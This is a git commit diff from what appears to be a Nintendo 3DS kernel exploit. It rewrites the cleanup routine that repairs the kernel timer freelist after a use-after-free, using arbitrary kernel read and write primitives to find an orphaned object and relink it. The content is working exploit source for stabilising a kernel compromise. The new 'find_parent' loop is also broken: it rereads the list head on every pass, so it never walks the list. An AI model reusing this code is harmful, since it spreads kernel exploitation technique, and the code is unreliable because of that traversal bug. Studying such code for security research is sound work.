a171fe2fb260469feeddbbd80b9b337d8a60c5c6
Ned Williamson <nedwilliamson@gmail.com>
2017-01-07 12:50:39 -0500

    Rewrite cleanup code.

--- source/cleanup.c
+++ source/cleanup.c
@@ -8,7 +8,7 @@
 #include "backdoor.h"
 #include "exploit.h"
 
-extern u32 ktimer_pool_head;
+extern void *ktimer_pool_head;
 extern u32 ktimer_pool_size;
 extern u32 ktimer_base_offset;
 
@@ -24,104 +24,88 @@ extern u32 ktimer_base_offset;
 #define TOBJ_ADDR_TO_IDX(base, addr) (((u32)(addr) - (u32)(base)) / KTIMER_OBJECT_SIZE)
 #define TOBJ_IDX_TO_ADDR(base, idx) ((u32)(base) + KTIMER_OBJECT_SIZE * (u32)(idx))
 
-static bool find_broken_link(void ***parent_ret, void **child_ret) {
+static void *find_orphan() {
   u32 num_timer_objects = ktimer_pool_size / KTIMER_OBJECT_SIZE;
-  // carry
+  /* How can the kernel allocate less than a full object?
+   * I don't think this will happen. */
+  /*
   if (ktimer_pool_size % KTIMER_OBJECT_SIZE) {
       num_timer_objects += 1;
   }
+  */
   void *ktimer_base = (void *)(0xFFF70000 + ktimer_base_offset);
   void *ktimer_end = (void *)((u32)ktimer_base + ktimer_pool_size);
 
-  void *next_table[num_timer_objects];
-  memset(next_table, 0, num_timer_objects * sizeof(void *));
-  void *prev_table[num_timer_objects];
-  memset(prev_table, 0, num_timer_objects * sizeof(void *));
-
-  /* initialize return values */
-  *parent_ret = NULL;
-  *child_ret = NULL;
+  bool reachable[num_timer_objects];
+  memset(reachable, 0, num_timer_objects * sizeof(bool));
 
   u32 i = 0;
-  /* build hash tables, O(n) */
-  for (void *parent = ktimer_base;
-       parent < ktimer_end;
-       parent += KTIMER_OBJECT_SIZE, i++) {
-    void *child = (void *)kreadint(parent);
-    if (TOBJ_ADDR_TO_IDX(ktimer_base, parent) != i) {
-      printf("[!] Got TOBJ_ADDR_TO_IDX(parent) != i: 0x%lx != 0x%lx\n",
-             TOBJ_ADDR_TO_IDX(ktimer_base, parent), i);
+  /* go through the timer table and find all reachable objects */
+  for (void *current_timer = ktimer_base;
+       current_timer < ktimer_end;
+       current_timer += KTIMER_OBJECT_SIZE, i++) {
+    void *child = (void *)kreadint(current_timer);
+
+    if (TOBJ_ADDR_TO_IDX(ktimer_base, current_timer) != i) {
+      printf("[!] Got TOBJ_ADDR_TO_IDX(current_timer) != i: 0x%lx != 0x%lx\n",
+             TOBJ_ADDR_TO_IDX(ktimer_base, current_timer), i);
       wait_for_user();
     }
-    printf("%ld -> 0x%lx (0x%lx)\n", TOBJ_ADDR_TO_IDX(ktimer_base, parent), (u32)child, TOBJ_ADDR_TO_IDX(ktimer_base, child));
+
     if (IS_KERNEL_NON_SLAB_HEAP(child)) {
-      /* for allocated objects, use non-null filler values since
-       * our checks just look for null
-       */
-      next_table[TOBJ_ADDR_TO_IDX(ktimer_base, parent)] = (void *)1;
-      /* write to 'parent' of both next and prev, clearing them */
-      /* TODO we should probably be checking if 1 was written already */
-      prev_table[TOBJ_ADDR_TO_IDX(ktimer_base, parent)] = (void *)1;
-    } else if (child == (void *)TIMER2_NEXT_KERNEL) {
-      *parent_ret = parent;
-      next_table[TOBJ_ADDR_TO_IDX(ktimer_base, parent)] = (void *)1;
+      /* object is allocated, therefore reachable */
+      reachable[TOBJ_ADDR_TO_IDX(ktimer_base, current_timer)] = true;
+    } else if (ktimer_base <= child && child < ktimer_end) {
+      /* object is freed, next pointer is reachable */
+      reachable[TOBJ_ADDR_TO_IDX(ktimer_base, child)] = true;
     } else {
-      /* if freed, add tuples in both directions */
-      next_table[TOBJ_ADDR_TO_IDX(ktimer_base, parent)] = child;
-      prev_table[TOBJ_ADDR_TO_IDX(ktimer_base, child)] = parent;
+      printf("[!] Warning! Timer table entry had non-vtable, non-freed entry!\n");
+      wait_for_user();
     }
   }
+
   if (i != num_timer_objects) {
     printf("[!] Unexpected number of iterations over timer object list.\n");
     printf("[!] Got %lu, expected %lu.\n", i, num_timer_objects);
-    return false;
+    return NULL;
   }
 
-  /* account for list head. only care about objects themselves, so don't
-   * update next_table.
-   */
-  void *head_parent = ktimer_pool_head;
-  void *head_child = (void *)kreadint_real(head_parent);
-  if (head_child) {
-    prev_table[TOBJ_ADDR_TO_IDX(ktimer_base, head_child)] = head_parent;
+  /* account for list head */
+  void *first_freed = (void *)kreadint_real(ktimer_pool_head);
+  if (first_freed) {
+    reachable[TOBJ_ADDR_TO_IDX(ktimer_base, first_freed)] = true;
   }
 
-  /* abandoned child node is lowest object with next != NULL, prev == NULL */
-  /* first null next: need to write correct next here */
-  /* only null prev: what to write there */
-
-  /* this could happen but if we really allocated all the timer objects, the
-   * exploit probably work work anyways :p gotta reboot!
-   */
-  if (next_table[num_timer_objects - 1] != NULL) {
-    printf("[!] Warning! Bad invariant: last node does not point to NULL\n");
-    printf("[!] The exploit cannot cleanup sufficiently.\n");
-    printf("[!] Please reboot your 3DS and try again.\n");
-    return false;
-  }
-
+  u32 num_unreachable = 0;
+  void *orphan = NULL;
   for (i = 0; i < num_timer_objects; i++) {
-    /* ignore last node for next, as it's always NULL */
-    if (prev_table[i] == NULL) {
-      if (*child_ret != NULL) {
-        printf("[!] Warning: unexpectedly found more than one NULL prev.\n");
-      }
-      *child_ret = (void *)TOBJ_IDX_TO_ADDR(ktimer_base, i);
-      printf("[+] found child: (%p ->) %p\n", prev_table[i], *child_ret);
+    if (!reachable[i]) {
+      num_unreachable++;
+      /* update only if necessary */
+      orphan = orphan ? orphan : (void *)TOBJ_IDX_TO_ADDR(ktimer_base, i);
     }
   }
-
-  if (*parent_ret == NULL) {
-    printf("[-] Failed to find parent for broken link search.\n");
-    return false;
+  if (num_unreachable != 1) {
+    printf("[!] Warning: expected one reachable node, found %ld!\n", num_unreachable);
   }
 
-  if (*child_ret == NULL) {
-    printf("[-] Failed to find child for broken link search.\n");
-    return false;
-  }
+  return orphan;
+}
 
-  return true;
+static void **find_parent() {
+  // traverse linked list until next points to userspace
+  void *current_node = ktimer_pool_head;
+  while (true) {
+    void *next = (void *)kreadint_real(ktimer_pool_head);
+
+    if (next == (void *)TIMER2_NEXT_KERNEL) {
+      return current_node;
+    } else if (next == NULL) {
+      return NULL;
+    }
+
+    current_node = next;
+  }
 }
 
 bool cleanup_uaf() {
@@ -130,16 +114,20 @@ bool cleanup_uaf() {
    * we need to fix that.
    */
 
-  void **parent = NULL;
-  void *child = NULL;
-
-  if (!find_broken_link(&parent, &child)) {
-    printf("[-] Failed to find broken link in linked list.\n");
+  void **parent = find_parent();
+  if (!parent) {
+    printf("[-] Failed to find parent in KTimer linked list.\n");
     return false;
   }
 
-  printf("Got broken link: %p -> %p\n", parent, child);
+  void *orphan = find_orphan();
+  if (!orphan) {
+    printf("[-] Failed to find orphan in KTimer linked list.\n");
+    return false;
+  }
 
-  kwriteint_real((u32 *)parent, (u32)child);
+  printf("Found parent and orphan: %p -> %p\n", parent, orphan);
+
+  kwriteint_real((u32 *)parent, (u32)orphan);
   return true;
 }
